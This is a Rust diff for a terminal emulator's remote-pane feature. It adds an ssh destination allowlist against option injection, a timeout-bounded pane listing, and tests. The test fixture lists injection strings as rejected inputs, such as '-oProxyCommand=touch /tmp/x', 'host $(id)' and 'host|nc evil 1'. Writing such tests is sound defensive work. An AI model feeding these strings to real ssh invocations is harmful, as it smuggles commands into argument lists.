@@ -769,6 +769,14 @@ impl RemotePty {
         if !rio_ptyd::sockdir::is_valid_pane_id(pane_id) {
             return Err(AttachError::Io(io::Error::other("invalid pane id")));
         }
+        // The dest reaches `ssh` as argv, and on restore it comes from
+        // the session file (not just palette input) — a tampered
+        // "host" of "-oProxyCommand=..." would be parsed by ssh as an
+        // option and run a local command with no user interaction.
+        // Reject option-injection and argument-splitting at the source.
+        if !is_safe_ssh_dest(dest) {
+            return Err(AttachError::Io(io::Error::other("unsafe ssh destination")));
+        }
         let mut child = Command::new("ssh")
             .arg("-oBatchMode=yes")
             .arg(dest)
@@ -878,4 +886,198 @@ fn set_nonblocking(fd: RawFd) -> io::Result<()> {
         }
     }
     Ok(())
+}
+
+/// Whether `dest` is safe to hand to `ssh` as a positional argument.
+///
+/// No shell is involved, so the hazards are option injection (a leading
+/// `-` makes ssh read it as a flag) and, via ssh_config `ProxyCommand`/
+/// `Match exec` with `%h` token expansion, shell metacharacters in the
+/// hostname reaching `/bin/sh`. A conservative allowlist — the
+/// characters that appear in real destinations (`user@host`, IPv6
+/// `[::1]`, `:port`, scope `%iface`, dotted/dashed names) — closes both
+/// without a shell round-trip. Rejects empty and leading-dash outright.
+pub fn is_safe_ssh_dest(dest: &str) -> bool {
+    if dest.is_empty() || dest.starts_with('-') {
+        return false;
+    }
+    dest.chars().all(|c| {
+        c.is_ascii_alphanumeric()
+            || matches!(c, '.' | '-' | '_' | '@' | ':' | '[' | ']' | '%')
+    })
+}
+
+/// List attachable rio-ptyd panes on an ssh destination for the
+/// palette picker: `(pane_id, "program  cwd  state")` per pane.
+/// Blocking, bounded by a wall-clock deadline (ConnectTimeout only
+/// covers the TCP phase; the remote command itself can hang and
+/// would strand the palette in its loading state forever) — run it
+/// off the event loop.
+pub fn list_remote_panes(dest: &str) -> Result<Vec<(String, String)>, String> {
+    use std::io::Read;
+    use std::time::{Duration, Instant};
+
+    if !is_safe_ssh_dest(dest) {
+        return Err("invalid ssh destination".into());
+    }
+    let mut child = Command::new("ssh")
+        .arg("-oBatchMode=yes")
+        .arg("-oConnectTimeout=8")
+        .arg(dest)
+        .arg("rio-ptyd")
+        .arg("list")
+        .arg("--json")
+        .stdin(Stdio::null())
+        .stdout(Stdio::piped())
+        .stderr(Stdio::piped())
+        .spawn()
+        .map_err(|e| format!("ssh: {e}"))?;
+    // Drain stdout/stderr on their OWN threads: a host with many panes
+    // emits a JSON list larger than the 64 KiB pipe buffer, and if we
+    // wait for exit BEFORE reading, ssh blocks writing, never exits, and
+    // the 20s watchdog kills it with the output discarded. Concurrent
+    // readers let the child finish regardless of output size.
+    let mut out_pipe = child.stdout.take();
+    let mut err_pipe = child.stderr.take();
+    let out_reader = std::thread::spawn(move || {
+        let mut s = String::new();
+        if let Some(p) = out_pipe.as_mut() {
+            let _ = p.read_to_string(&mut s);
+        }
+        s
+    });
+    let err_reader = std::thread::spawn(move || {
+        let mut s = String::new();
+        if let Some(p) = err_pipe.as_mut() {
+            let _ = p.read_to_string(&mut s);
+        }
+        s
+    });
+    let deadline = Instant::now() + Duration::from_secs(20);
+    let status = loop {
+        match child.try_wait() {
+            Ok(Some(status)) => break status,
+            Ok(None) => {
+                if Instant::now() >= deadline {
+                    let _ = child.kill();
+                    let _ = child.wait();
+                    return Err("ssh timed out listing panes".into());
+                }
+                std::thread::sleep(Duration::from_millis(100));
+            }
+            // A wait error (ECHILD-class) still needs the child reaped
+            // so the reader threads' pipes reach EOF.
+            Err(e) => {
+                let _ = child.kill();
+                let _ = child.wait();
+                return Err(format!("ssh: {e}"));
+            }
+        }
+    };
+    // The client ssh has exited, but its stdout/stderr write ends can
+    // outlive it if a ControlPersist mux master inherited them — the
+    // pipes then never hit EOF and a bare join() would hang forever
+    // (the very palette-stuck symptom this timeout exists to avoid).
+    // Bound the join with a deadline; drop a still-blocked reader.
+    let join_deadline = Instant::now() + Duration::from_secs(3);
+    let join_bounded = |h: std::thread::JoinHandle<String>| -> String {
+        while !h.is_finished() {
+            if Instant::now() >= join_deadline {
+                return String::new(); // reader stranded on an inherited pipe
+            }
+            std::thread::sleep(Duration::from_millis(20));
+        }
+        h.join().unwrap_or_default()
+    };
+    let stdout = join_bounded(out_reader);
+    let stderr = join_bounded(err_reader);
+    if !status.success() {
+        let err = stderr.trim();
+        return Err(if err.is_empty() {
+            format!("ssh exited with {status}")
+        } else {
+            err.to_string()
+        });
+    }
+    parse_remote_pane_list(&stdout)
+}
+
+fn parse_remote_pane_list(json: &str) -> Result<Vec<(String, String)>, String> {
+    let entries: Vec<serde_json::Value> = serde_json::from_str(json.trim())
+        .map_err(|e| format!("bad rio-ptyd list output: {e}"))?;
+    let mut panes = Vec::new();
+    for entry in entries {
+        let Some(pane_id) = entry["pane_id"].as_str() else {
+            continue;
+        };
+        // Only a live daemon can accept an attach.
+        if !entry["alive"].as_bool().unwrap_or(false) {
+            continue;
+        }
+        let program = entry["program"].as_str().unwrap_or("?");
+        let cwd = entry["cwd"].as_str().unwrap_or("-");
+        let state = match entry["exited_status"].as_i64() {
+            Some(code) => format!("exited({code})"),
+            None => "running".into(),
+        };
+        panes.push((pane_id.to_string(), format!("{program}  {cwd}  {state}")));
+    }
+    Ok(panes)
+}
+
+#[cfg(test)]
+mod remote_list_tests {
+    use super::{is_safe_ssh_dest, parse_remote_pane_list};
+
+    #[test]
+    fn ssh_dest_allowlist_blocks_injection() {
+        // Legit destinations pass.
+        for ok in [
+            "host",
+            "user@host",
+            "user@host.example.com",
+            "[::1]",
+            "user@[2001:db8::1]",
+            "fe80::1%eth0",
+            "host:2222",
+        ] {
+            assert!(is_safe_ssh_dest(ok), "should allow {ok:?}");
+        }
+        // Injection / option / shell-metachar attempts are rejected —
+        // this is the single security chokepoint before ssh argv.
+        for bad in [
+            "",
+            "-oProxyCommand=touch /tmp/x",
+            "-lroot",
+            "host;id",
+            "host $(id)",
+            "host`id`",
+            "a b",
+            "host=evil",
+            "host|nc evil 1",
+            "host\nreset",
+        ] {
+            assert!(!is_safe_ssh_dest(bad), "should reject {bad:?}");
+        }
+    }
+
+    #[test]
+    fn parses_alive_panes_and_skips_dead() {
+        let json = r#"[
+            {"pane_id":"a","program":"bash","cwd":"/tmp","alive":true,"exited_status":null},
+            {"pane_id":"b","program":"zsh","cwd":"/etc","alive":false,"exited_status":null},
+            {"pane_id":"c","program":"sh","cwd":null,"alive":true,"exited_status":1}
+        ]"#;
+        let panes = parse_remote_pane_list(json).unwrap();
+        assert_eq!(panes.len(), 2);
+        assert_eq!(panes[0].0, "a");
+        assert_eq!(panes[0].1, "bash  /tmp  running");
+        assert_eq!(panes[1].0, "c");
+        assert_eq!(panes[1].1, "sh  -  exited(1)");
+    }
+
+    #[test]
+    fn rejects_garbage() {
+        assert!(parse_remote_pane_list("not json").is_err());
+    }
 }
